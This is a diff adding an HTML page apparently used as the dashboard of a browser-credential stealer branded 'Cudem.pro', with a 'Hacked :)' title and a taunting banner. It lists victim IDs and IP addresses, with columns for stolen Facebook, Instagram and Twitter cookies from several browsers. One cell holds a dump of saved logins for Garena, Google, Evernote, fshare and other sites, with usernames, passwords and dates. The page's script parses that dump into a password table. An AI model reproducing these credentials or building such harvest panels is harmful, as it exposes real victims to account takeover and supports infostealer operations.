@@ -1,0 +1,234 @@
+<!-- Code được viết bởi sharescript -->
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Hacked :)</title>
+<style>
+*{
+    margin: 0;
+    padding: 0;
+}
+::-webkit-scrollbar{
+    width:10px
+}
+::-webkit-scrollbar-track{
+    background:black
+}
+::-webkit-scrollbar-thumb{
+    background:#00ff00
+}
+::-webkit-scrollbar-thumb:hover{
+    background:#00A000
+}
+canvas {
+    display:block;
+}
+body{
+    background-color: black;
+}
+.customers {
+  font-family: Arial, Helvetica, sans-serif;
+  border-collapse: collapse;
+  width: 100%;
+}
+
+.customers td {
+  border: 1px solid #00FF00;
+  color: #00FF00;
+  padding: 8px;
+}
+
+.customers th{
+    padding: 8px;
+border: 1px solid black;
+text-align: center;
+}
+
+.customers tr:nth-child(even){background-color: transparent;}
+
+.customers tr:hover {background-color: #004900;}
+
+.customers th {
+  padding-top: 12px;
+  padding-bottom: 12px;
+  text-align: left;
+  background-color: #00FF00;
+  color: black;
+}
+textarea{
+    overflow:hidden;
+    border: 1px solid #00FF00 ;
+    width: 100%;
+    color: #00FF00;
+    background-color: transparent;
+    resize: none;
+}
+#copied{
+    background-color: #00FF00;
+    padding: 10px 20px;
+    display: none;
+    box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.5), 0 6px 20px 0 rgba(0, 0, 0, 0.19);
+    border-radius: 3px;
+    position: absolute;
+    top: 50%;
+    left: 50%;
+    margin-right: -50%;
+    transform: translate(-50%, -50%)
+}
+.close{
+    background-color: #00FF00;
+    padding: 5px 10px;
+    border-radius: 3px;
+    color: black;
+    cursor: pointer;
+}
+.buttongo{
+    margin-top: 3px;
+    background-color: #00FF00;
+    padding: 2px 5px;
+    text-align: center;
+    font-size: 12px;
+    color: black;
+    cursor: pointer;
+}
+.buttongo:hover{
+    background-color: #81FF81;
+}
+.popup{
+    background-color: RGBA(0,0,0,0.66);
+    padding: 10px 20px;
+    box-shadow: 0 4px 8px 0 RGBA(0,146,0,0.5), 0 6px 20px 0 RGBA(0,146,0,0.5);
+    border-top: 3px solid #00FF00;
+    border-radius: 3px;
+    width: 100%;
+    color: #00FF00;
+    position: absolute;
+    box-sizing: border-box;
+    display: none;
+    min-height: 700px;
+}
+</style>
+</head>
+<body>
+<canvas id="c" style="position: fixed; z-index:-9999"></canvas>
+<div id="copied" style="z-index: 999999">
+    Đã copy vào bộ nhớ đệm!
+</div>
+<div style="z-index:99999">
+<div id="pop" class="popup">
+<center><a class="close" onclick="closepopup()">Đóng</a></center>
+<span id="demo"></span>
+</div>
+
+<br><br><br><br><br>
+<center><span style="background: url(&quot;http://i106.photobucket.com/albums/m280/YukioKenshin/chopnhay.gif&quot;) repeat scroll 0% 0% transparent; color:white; text-shadow: #00ff00 0px 0px 6px, #00ff00 0px 0px 5px, #00ff00 0px 0px 5px;font-size: 50px; font-weight: bold;">Một Con Chó Đang Đọc Dòng Chữ Này</span>
+</center>
+<embed src="https://www.youtube.com/v/taukA1Sy1uc&autoplay=1&loop=1" type="application/x-shockwave-flash" allowscriptaccess="always" allowfullscreen="true" width="0" height="0"></embed>
+<br><br><br><br><br><br><br>
+<table class="customers">
+  <tr>
+    <th>ID</th>
+    <th>EDGE FB</th>
+    <th>EDGE IG</th>
+    <th>EDGE TW</th>
+    <th>CHROME FB</th>
+    <th>CHROME IG</th>
+    <th>CHROME TW</th>
+    <th>FIREFOX FB</th>
+    <th>FIREFOX IG</th>
+    <th>FIREFOX TW</th>
+    <th>OPERA FB</th>
+    <th>OPERA IG</th>
+    <th>OPERA TW</th>
+    <th>PASS</th>
+  </tr>
+  <tr><td>20</td><td><textarea class='copp' id='0' onclick='copyfunction(this.id)'>Không có trình duyệt</textarea></td><td><textarea class='copp' id='1' onclick='copyfunction(this.id)'>Không có trình duyệt</textarea></td><td><textarea class='copp' id='2' onclick='copyfunction(this.id)'>Không có trình duyệt</textarea></td><td><textarea class='copp' id='3'onclick='copyfunction(this.id)'>Không có trình duyệt</textarea></td><td><textarea class='copp' id='4' onclick='copyfunction(this.id)'>Không có trình duyệt</textarea></td><td><textarea class='copp' id='5' onclick='copyfunction(this.id)'>Không có trình duyệt</textarea></td><td><textarea class='copp' id='6' onclick='copyfunction(this.id)'>Không có trình duyệt</textarea></td><td><textarea class='copp' id='7' onclick='copyfunction(this.id)'>Không có trình duyệt</textarea></td><td><textarea class='copp' id='8' onclick='copyfunction(this.id)'>Không có trình duyệt</textarea></td><td><textarea class='copp' id='9' onclick='copyfunction(this.id)'>Không có trình duyệt</textarea></td><td><textarea class='copp' id='10' onclick='copyfunction(this.id)'>Không có trình duyệt</textarea></td><td><textarea class='copp' id='11' onclick='copyfunction(this.id)'>Không có trình duyệt</textarea></td><td><textarea class='copp' id='12' onclick='copyfunction(this.id)'>172.19.154.218</textarea><div class='buttongo' id='12' onclick='xempassword(this.id)'>Xem mật khẩu</div></td></tr><tr><td>21</td><td><textarea class='copp' id='13' onclick='copyfunction(this.id)'>Cookie</textarea><div class='buttongo' onclick='openFB()'>Đến FB</div></td><td><textarea class='copp' id='14' onclick='copyfunction(this.id)'>Trống</textarea></td><td><textarea class='copp' id='15' onclick='copyfunction(this.id)'>Trống</textarea></td><td><textarea class='copp' id='16'onclick='copyfunction(this.id)'>Trống</textarea></td><td><textarea class='copp' id='17' onclick='copyfunction(this.id)'>Trống</textarea></td><td><textarea class='copp' id='18' onclick='copyfunction(this.id)'>Trống</textarea></td><td><textarea class='copp' id='19' onclick='copyfunction(this.id)'>Không có trình duyệt</textarea></td><td><textarea class='copp' id='20' onclick='copyfunction(this.id)'>Không có trình duyệt</textarea></td><td><textarea class='copp' id='21' onclick='copyfunction(this.id)'>Không có trình duyệt</textarea></td><td><textarea class='copp' id='22' onclick='copyfunction(this.id)'>Không có trình duyệt</textarea></td><td><textarea class='copp' id='23' onclick='copyfunction(this.id)'>Không có trình duyệt</textarea></td><td><textarea class='copp' id='24' onclick='copyfunction(this.id)'>Không có trình duyệt</textarea></td><td><textarea class='copp' id='25' onclick='copyfunction(this.id)'>192.168.1.14</textarea><div class='buttongo' id='25' onclick='xempassword(this.id)'>Xem mật khẩu</div></td></tr><tr><td>22</td><td><textarea class='copp' id='26' onclick='copyfunction(this.id)'>Không có trình duyệt</textarea></td><td><textarea class='copp' id='27' onclick='copyfunction(this.id)'>Không có trình duyệt</textarea></td><td><textarea class='copp' id='28' onclick='copyfunction(this.id)'>Không có trình duyệt</textarea></td><td><textarea class='copp' id='29'onclick='copyfunction(this.id)'>Không có trình duyệt</textarea></td><td><textarea class='copp' id='30' onclick='copyfunction(this.id)'>Không có trình duyệt</textarea></td><td><textarea class='copp' id='31' onclick='copyfunction(this.id)'>Không có trình duyệt</textarea></td><td><textarea class='copp' id='32' onclick='copyfunction(this.id)'>Trống</textarea></td><td><textarea class='copp' id='33' onclick='copyfunction(this.id)'>Trống</textarea></td><td><textarea class='copp' id='34' onclick='copyfunction(this.id)'>Trống</textarea></td><td><textarea class='copp' id='35' onclick='copyfunction(this.id)'>Không có trình duyệt</textarea></td><td><textarea class='copp' id='36' onclick='copyfunction(this.id)'>Không có trình duyệt</textarea></td><td><textarea class='copp' id='37' onclick='copyfunction(this.id)'>Không có trình duyệt</textarea></td><td><textarea class='copp' id='38' onclick='copyfunction(this.id)'></textarea></td></tr><tr><td>23</td><td><textarea class='copp' id='39' onclick='copyfunction(this.id)'>Không có trình duyệt</textarea></td><td><textarea class='copp' id='40' onclick='copyfunction(this.id)'>Không có trình duyệt</textarea></td><td><textarea class='copp' id='41' onclick='copyfunction(this.id)'>Không có trình duyệt</textarea></td><td><textarea class='copp' id='42'onclick='copyfunction(this.id)'>Không có trình duyệt</textarea></td><td><textarea class='copp' id='43' onclick='copyfunction(this.id)'>Không có trình duyệt</textarea></td><td><textarea class='copp' id='44' onclick='copyfunction(this.id)'>Không có trình duyệt</textarea></td><td><textarea class='copp' id='45' onclick='copyfunction(this.id)'>Không có trình duyệt</textarea></td><td><textarea class='copp' id='46' onclick='copyfunction(this.id)'>Không có trình duyệt</textarea></td><td><textarea class='copp' id='47' onclick='copyfunction(this.id)'>Không có trình duyệt</textarea></td><td><textarea class='copp' id='48' onclick='copyfunction(this.id)'>Không có trình duyệt</textarea></td><td><textarea class='copp' id='49' onclick='copyfunction(this.id)'>Không có trình duyệt</textarea></td><td><textarea class='copp' id='50' onclick='copyfunction(this.id)'>Không có trình duyệt</textarea></td><td><textarea class='copp' id='51' onclick='copyfunction(this.id)'>192.168.56.32</textarea><div class='buttongo' id='51' onclick='xempassword(this.id)'>Xem mật khẩu</div></td></tr><tr><td>24</td><td><textarea class='copp' id='52' onclick='copyfunction(this.id)'>Trống</textarea></td><td><textarea class='copp' id='53' onclick='copyfunction(this.id)'>Trống</textarea></td><td><textarea class='copp' id='54' onclick='copyfunction(this.id)'>Cookie</textarea><div class='buttongo' onclick='openTW()'>Đến TW</div></td><td><textarea class='copp' id='55'onclick='copyfunction(this.id)'>Trống</textarea></td><td><textarea class='copp' id='56' onclick='copyfunction(this.id)'>Trống</textarea></td><td><textarea class='copp' id='57' onclick='copyfunction(this.id)'>Trống</textarea></td><td><textarea class='copp' id='58' onclick='copyfunction(this.id)'>Trống</textarea></td><td><textarea class='copp' id='59' onclick='copyfunction(this.id)'>Trống</textarea></td><td><textarea class='copp' id='60' onclick='copyfunction(this.id)'>Trống</textarea></td><td><textarea class='copp' id='61' onclick='copyfunction(this.id)'>Không có trình duyệt</textarea></td><td><textarea class='copp' id='62' onclick='copyfunction(this.id)'>Không có trình duyệt</textarea></td><td><textarea class='copp' id='63' onclick='copyfunction(this.id)'>Không có trình duyệt</textarea></td><td><textarea class='copp' id='64' onclick='copyfunction(this.id)'>169.254.51.239</textarea><div class='buttongo' id='64' onclick='xempassword(this.id)'>Xem mật khẩu</div></td></tr><tr><td>25</td><td><textarea class='copp' id='65' onclick='copyfunction(this.id)'>Không có trình duyệt</textarea></td><td><textarea class='copp' id='66' onclick='copyfunction(this.id)'>Không có trình duyệt</textarea></td><td><textarea class='copp' id='67' onclick='copyfunction(this.id)'>Không có trình duyệt</textarea></td><td><textarea class='copp' id='68'onclick='copyfunction(this.id)'>Không có trình duyệt</textarea></td><td><textarea class='copp' id='69' onclick='copyfunction(this.id)'>Không có trình duyệt</textarea></td><td><textarea class='copp' id='70' onclick='copyfunction(this.id)'>Không có trình duyệt</textarea></td><td><textarea class='copp' id='71' onclick='copyfunction(this.id)'>Trống</textarea></td><td><textarea class='copp' id='72' onclick='copyfunction(this.id)'>Trống</textarea></td><td><textarea class='copp' id='73' onclick='copyfunction(this.id)'>Trống</textarea></td><td><textarea class='copp' id='74' onclick='copyfunction(this.id)'>Không có trình duyệt</textarea></td><td><textarea class='copp' id='75' onclick='copyfunction(this.id)'>Không có trình duyệt</textarea></td><td><textarea class='copp' id='76' onclick='copyfunction(this.id)'>Không có trình duyệt</textarea></td><td><textarea class='copp' id='77' onclick='copyfunction(this.id)'>10.150.137.245</textarea><div class='buttongo' id='77' onclick='xempassword(this.id)'>Xem mật khẩu</div></td></tr><tr><td>19</td><td><textarea class='copp' id='78' onclick='copyfunction(this.id)'>Cookie</textarea><div class='buttongo' onclick='openFB()'>Đến FB</div></td><td><textarea class='copp' id='79' onclick='copyfunction(this.id)'>Trống</textarea></td><td><textarea class='copp' id='80' onclick='copyfunction(this.id)'>Cookie</textarea><div class='buttongo' onclick='openTW()'>Đến TW</div></td><td><textarea class='copp' id='81'onclick='copyfunction(this.id)'>Cookie</textarea><div class='buttongo' onclick='openFB()'>Đến FB</div></td><td><textarea class='copp' id='82' onclick='copyfunction(this.id)'>Cookie</textarea><div class='buttongo' onclick='openIG()'>Đến IG</div></td><td><textarea class='copp' id='83' onclick='copyfunction(this.id)'>Cookie</textarea><div class='buttongo' onclick='openTW()'>Đến TW</div></td><td><textarea class='copp' id='84' onclick='copyfunction(this.id)'>Không có trình duyệt</textarea></td><td><textarea class='copp' id='85' onclick='copyfunction(this.id)'>Không có trình duyệt</textarea></td><td><textarea class='copp' id='86' onclick='copyfunction(this.id)'>Không có trình duyệt</textarea></td><td><textarea class='copp' id='87' onclick='copyfunction(this.id)'>Không có trình duyệt</textarea></td><td><textarea class='copp' id='88' onclick='copyfunction(this.id)'>Không có trình duyệt</textarea></td><td><textarea class='copp' id='89' onclick='copyfunction(this.id)'>Không có trình duyệt</textarea></td><td><textarea class='copp' id='90' onclick='copyfunction(this.id)'>*@@@[email protected]*@@@#@#@#@*@@@[email protected]*@@@45626865#@#@#@*@@@[email protected]*@@@#@#@#@*@@@[email protected]*@@@#@#@#@*@@@89525626*@@@gaa1238*@@@2019-09-26 03:17:55.159549*@@@2021-01-20 07:19:37.555491#@#@#@https://auth.garena.com/oauth/login*@@@fakefake*@@@gaa123*@@@2019-10-09 10:37:15.838460*@@@2020-08-03 16:10:12.188342#@#@#@https://auth.garena.com/oauth/login*@@@bubuvsbubu*@@@vclvcl*@@@2019-10-15 12:25:55.195955*@@@2020-07-23 08:07:32.108264#@#@#@https://www.evernote.com/Registration.action*@@@[email protected]*@@@*@@@2019-12-19 08:23:10.205442*@@@2019-12-19 08:23:04.980835#@#@#@https://accounts.google.com/signin/v2/challenge/password/empty*@@@[email protected]*@@@hahaha123*@@@2020-01-03 13:38:14.407359*@@@2020-10-28 04:01:40.959193#@#@#@https://www.fshare.vn/site/login*@@@[email protected]*@@@@123456*@@@2020-02-22 11:11:34.801779*@@@2021-01-26 12:36:40.359978#@#@#@http://edu.vn:8082/*@@@dsfshdfsdf*@@@02sdfds88*@@@2020-02-23 07:44:46.126523*@@@2020-02-24 08:49:21.324497</textarea><div class='buttongo' id='90' onclick='xempassword(this.id)'>Xem mật khẩu</div></td></tr></table>
+<center style="color: #00FF00;margin: 15px 0px;">2021 Cudem.pro :)</center>
+</div>
+<script>
+function copyfunction(idd) {
+  var copyText = document.getElementsByClassName('copp')[Number(idd)];
+  copyText.select();
+  copyText.setSelectionRange(0, 99999)
+  document.execCommand("copy");
+  document.getElementById("copied").style.display = "block";
+  setTimeout(function(){
+    document.getElementById("copied").style.display = "none";
+  },3000);
+}
+function closepopup() {
+document.getElementById("pop").style.display = "none";
+}
+function openFB() {
+    window.open(
+      "https://facebook.com", "_blank");
+}
+function openIG() {
+    window.open(
+      "https://instagram.com", "_blank");
+}
+function openTW() {
+    window.open(
+      "https://twitter.com", "_blank");
+}
+function xempassword(idd) {
+  var output = `<table class="customers" style="width: 100%; margin-top: 10px">
+  <tr>
+    <th>Link login</th>
+    <th>User</th>
+    <th>Pass</th>
+    <th>Ngày tạo</th>
+    <th>Xài gần nhất</th>
+  </tr>`;
+  var source2 = document.getElementsByClassName('copp')[Number(idd)].value;
+  var list = source2.split("#@#@#@");
+for(i = 0; i < list.length - 1; i++){
+    output += "<tr>";
+    var list2 = list[i].split("*@@@");
+    for(j = 0; j < list2.length; j++){
+        if(j == 0) output += "<td><a href='"+list2[j]+"' style='color: #00ff00' target='_blank'>" + list2[j] + "</a></td>";
+        if(j == 1) output += "<td>" + list2[j] + "</td>";
+        if(j == 2) output += "<td>" + list2[j] + "</td>";
+        if(j == 3) output += "<td>" + list2[j] + "</td>";
+        if(j == 4) output += "<td>" + list2[j] + "</td>";
+    }
+    output += "<tr>";
+}
+output += "</table>";
+document.getElementById("demo").innerHTML = output;
+document.getElementById("pop").style.display = "block";
+}
+var c = document.getElementById("c");
+var ctx = c.getContext("2d");
+c.height = window.innerHeight;
+c.width = window.innerWidth;
+var matrix = "Hacked by GrouSrlpPrsc :)";
+matrix = matrix.split("");
+
+var font_size = 10;
+var columns = c.width/font_size;
+var drops = [];
+for(var x = 0; x < columns; x++)
+    drops[x] = 1;
+function draw()
+{
+    ctx.fillStyle = "rgba(0, 0, 0, 0.04)";
+    ctx.fillRect(0, 0, c.width, c.height);
+
+    ctx.fillStyle = "#0F0";
+    ctx.font = font_size + "px arial";
+    for(var i = 0; i < drops.length; i++)
+    {
+        var text = matrix[Math.floor(Math.random()*matrix.length)];
+        //x = i*font_size, y = value of drops[i]*font_size
+        ctx.fillText(text, i*font_size, drops[i]*font_size);
+        if(drops[i]*font_size > c.height && Math.random() > 0.975)
+            drops[i] = 0;
+        drops[i]++;
+    }
+}
+setInterval(draw, 35);
+</script>
+</body>
+</html>
